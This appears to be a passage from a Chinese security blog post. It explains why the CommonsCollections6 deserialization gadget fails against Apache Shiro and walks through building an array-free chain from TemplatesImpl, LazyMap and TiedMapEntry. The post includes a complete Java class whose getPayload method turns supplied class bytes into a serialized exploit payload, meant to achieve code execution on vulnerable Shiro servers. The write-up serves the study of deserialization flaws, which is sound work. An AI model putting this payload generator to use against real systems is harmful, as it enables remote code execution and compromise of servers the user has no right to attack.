+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161128608.webp" alt="image-20240816112805305" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161128608.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161128608.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161128608.webp?size=large 2x" data-title="image-20240816112805305" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>找到报错的org.apache.shiro.io.ClassResolvingObjectInputStream 。是一个ObjectInputStream的子类，其重写了resolveClass 方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">ClassResolvingObjectInputStream</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">ObjectInputStream</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">ClassResolvingObjectInputStream</span>(<span style="color:#58a1dd">InputStream</span> <span style="color:#58a1dd">inputStream</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">super</span>(<span style="color:#58a1dd">inputStream</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&lt;?&gt;</span> <span style="color:#58a1dd">resolveClass</span>(<span style="color:#58a1dd">ObjectStreamClass</span> <span style="color:#58a1dd">osc</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">ClassNotFoundException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">ClassUtils</span>.<span style="color:#58a1dd">forName</span>(<span style="color:#58a1dd">osc</span>.<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">UnknownClassException</span> <span style="color:#58a1dd">var3</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">throw</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ClassNotFoundException</span>(<span style="color:#a6be9d">&#34;Unable to load ObjectStreamClass [&#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">osc</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;]: &#34;</span>, <span style="color:#58a1dd">var3</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><blockquote>
+<p>resolveClass 是反序列化中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的java.lang.Class 对象。</p>
+<p>对比一下它的父类，也就是正常的ObjectInputStream 类中的resolveClass 方法：</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">protected</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&lt;?&gt;</span> <span style="color:#58a1dd">resolveClass</span>(<span style="color:#58a1dd">ObjectStreamClass</span> <span style="color:#58a1dd">desc</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">ClassNotFoundException</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">desc</span>.<span style="color:#58a1dd">getName</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">Class</span>.<span style="color:#58a1dd">forName</span>(<span style="color:#58a1dd">name</span>, <span style="color:#ff636f">false</span>, <span style="color:#58a1dd">latestUserDefinedLoader</span>());
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">ClassNotFoundException</span> <span style="color:#58a1dd">ex</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Class</span><span style="color:#ff636f">&lt;?&gt;</span> <span style="color:#58a1dd">cl</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">primClasses</span>.<span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">name</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">cl</span> <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">return</span> <span style="color:#58a1dd">cl</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">throw</span> <span style="color:#58a1dd">ex</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>可以发现这里重写的 resolveClass方法用了ClassUtils.forName，而他的父类用的是 Class.forName</p>
+<p>在捕获异常的地方下断点看是哪个类报的异常</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161253789.webp" alt="image-20240816125326559" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161253789.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161253789.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161253789.webp?size=large 2x" data-title="image-20240816125326559" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>出异常时加载的类名为[Lorg.apache.commons.collections.Transformer;</p>
+<h6 id="结论" class="heading-element"><span>0.0.0.2.1  结论</span>
+  <a href="#%e7%bb%93%e8%ae%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如果反序列化流中包含<strong>非Java自身的数组</strong>，则会出现无法加载类的错误。</p>
+<p>这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
+<h5 id="构造不含数组的反序列化gadget" class="heading-element"><span>0.0.0.3  构造不含数组的反序列化Gadget</span>
+  <a href="#%e6%9e%84%e9%80%a0%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96gadget" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>为解决这个问题，Orange在其文章中给出了使用JRMP的利用方法：http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html。</p>
+<p>这里还有其他方法</p>
+<p>cc3中的TemplatesImpl可以执行字节码，使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes这部分利用链上是不存在数组类型的对象的。这里我们的后半段依然采用这个方法</p>
+<p>那么，接下来的重点就是找一个如何触发<code>TemplatesImpl.newTransformer</code>的方法了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span> {<span style="color:#a6be9d">&#34;...bytescode&#34;</span>});
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">obj</span>.<span style="color:#58a1dd">newTransformer</span>();</span></span></code></pre></div><p>而cc3是可以用InvokerTransformer去调用的</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">transformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span>{
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">obj</span>),
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;newTransformer&#34;</span>, <span style="color:#ff636f">null</span>, <span style="color:#ff636f">null</span>)
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>我们在cc3中没有用这种调用方式，而是寻找到两个新的类去触发</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">transformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">TrAXFilter</span>.<span style="color:#58a1dd">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InstantiateTransformer</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">Templates</span>.<span style="color:#58a1dd">class</span> },<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">obj</span> })
+</span></span><span style="display:flex;"><span>        };</span></span></code></pre></div><p>这里仍然用到了Transformer数组，不符合条件。</p>
+<p>如何去除这一过程中的Transformer数组呢？wh1t3p1g在这篇文章里给出了一个行之有效的方法。</p>
+<p><a href="https://www.anquanke.com/post/id/192619"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/192619</a></p>
+<blockquote>
+<p><code>ChainedTransformer</code>这个类的利用是无法成功的，因为他的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，也就是在执行过程中发生的<code>ClassNotFoundException</code>。</p>
+</blockquote>
+<p>我们一直以来的ChainedTransformer这个“得力助手”就直接被ban掉了</p>
+<p>所以我们既不能从ChainedTransformer过去，又得找地方调用到<code>TemplatesImpl.newTransformer</code></p>
+<p>这里就用到了CC6中横空出世的tme（TiedMapEntry）</p>
+<p>我们之前用tme的姿势是用它来调用LazyMap的get方法，这里再贴一张之前截的图</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121025253.webp" alt="image-20240812102526044" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121025253.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121025253.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121025253.webp?size=large 2x" data-title="image-20240812102526044" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里的map参数是LazyMap时，其get方法就是触发transform的关键点（CC6里）</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">key</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// create value for key if key is not currently in the map</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">map</span>.<span style="color:#58a1dd">containsKey</span>(<span style="color:#58a1dd">key</span>) <span style="color:#ff636f">==</span> <span style="color:#ff636f">false</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">value</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">factory</span>.<span style="color:#58a1dd">transform</span>(<span style="color:#58a1dd">key</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">map</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">key</span>, <span style="color:#58a1dd">value</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#58a1dd">value</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#58a1dd">map</span>.<span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">key</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>再次借用P神的分析</p>
+<blockquote>
+<p>我们以往构造CommonsCollections Gadget的时候，对LazyMap#get 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p>
+<p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个LazyMap#get 的参数key，会被传进transform()，实际上它可以扮演ConstantTransformer的角色——一个简单的对象传递者。</p>
+</blockquote>
+<p>这里也是很好理解，ConstantTransformer是返回类里面构造好的一个对象，这里getkey依然可以完成这个功能，那么这里相当于ConstantTransformer“复活”了。再去看看别的地方是怎么打通的。</p>
+<h5 id="改造cc6为cc-shiro" class="heading-element"><span>0.0.0.4  改造CC6为CC Shiro</span>
+  <a href="#%e6%94%b9%e9%80%a0cc6%e4%b8%bacc-shiro" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>首先还是创建TemplatesImpl 对象：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span> {<span style="color:#a6be9d">&#34;...bytescode&#34;</span>});
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());</span></span></code></pre></div><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一个人畜无害的方法，比如getClass ，避免恶意方法在构造Gadget的时候触发：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span> <span style="color:#58a1dd">transformer</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;getClass&#34;</span>, <span style="color:#ff636f">null</span>, <span style="color:#ff636f">null</span>);</span></span></code></pre></div><p>再把老的CommonsCollections6的代码复制过来，然后改上一节说到的点，就是将原来TiedMapEntry构造时的第二个参数key，改为前面创建的TemplatesImpl 对象：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">innerMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">outerMap</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LazyMap</span>.<span style="color:#58a1dd">decorate</span>(<span style="color:#58a1dd">innerMap</span>, <span style="color:#58a1dd">transformer</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">TiedMapEntry</span> <span style="color:#58a1dd">tme</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TiedMapEntry</span>(<span style="color:#58a1dd">outerMap</span>, <span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">expMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">expMap</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">tme</span>, <span style="color:#a6be9d">&#34;valuevalue&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">outerMap</span>.<span style="color:#58a1dd">clear</span>();</span></span></code></pre></div><p>完整代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">CommonsCollectionsShiro</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">fieldName</span>, <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">value</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Field</span> <span style="color:#58a1dd">field</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">obj</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getDeclaredField</span>(<span style="color:#58a1dd">fieldName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">setAccessible</span>(<span style="color:#ff636f">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">set</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">getPayload</span>(<span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">clazzBytes</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span>{<span style="color:#58a1dd">clazzBytes</span>});
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span> <span style="color:#58a1dd">transformer</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;getClass&#34;</span>, <span style="color:#ff636f">null</span>, <span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">innerMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">outerMap</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LazyMap</span>.<span style="color:#58a1dd">decorate</span>(<span style="color:#58a1dd">innerMap</span>, <span style="color:#58a1dd">transformer</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TiedMapEntry</span> <span style="color:#58a1dd">tme</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TiedMapEntry</span>(<span style="color:#58a1dd">outerMap</span>, <span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">expMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">expMap</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">tme</span>, <span style="color:#a6be9d">&#34;valuevalue&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">outerMap</span>.<span style="color:#58a1dd">clear</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">transformer</span>, <span style="color:#a6be9d">&#34;iMethodName&#34;</span>, <span style="color:#a6be9d">&#34;newTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// ==================</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 生成序列化字符串</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ByteArrayOutputStream</span> <span style="color:#58a1dd">barr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ByteArrayOutputStream</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectOutputStream</span> <span style="color:#58a1dd">oos</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectOutputStream</span>(<span style="color:#58a1dd">barr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">writeObject</span>(<span style="color:#58a1dd">expMap</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">barr</span>.<span style="color:#58a1dd">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h5 id="调试" class="heading-element"><span>0.0.0.5  调试</span>
+  <a href="#%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>让我们开始调试吧</p>
+<p>又给我跳过断点，留意一下</p>
